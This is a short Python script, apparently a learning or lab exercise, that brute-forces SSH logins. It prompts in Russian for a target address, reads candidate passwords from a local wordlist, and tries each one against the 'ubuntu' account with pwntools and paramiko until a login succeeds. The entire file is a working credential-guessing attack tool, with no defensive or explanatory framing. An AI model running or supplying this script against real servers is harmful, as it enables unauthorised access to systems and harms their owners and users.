from pwn import *
import paramiko

host = input("Введите адрес цели\n")
username = "ubuntu"
attempts = 0

with open("passwords.txt", "r") as passwords_list:
    for password in passwords_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=2)

            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break

            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("Invalid password!")

        attempts += 1
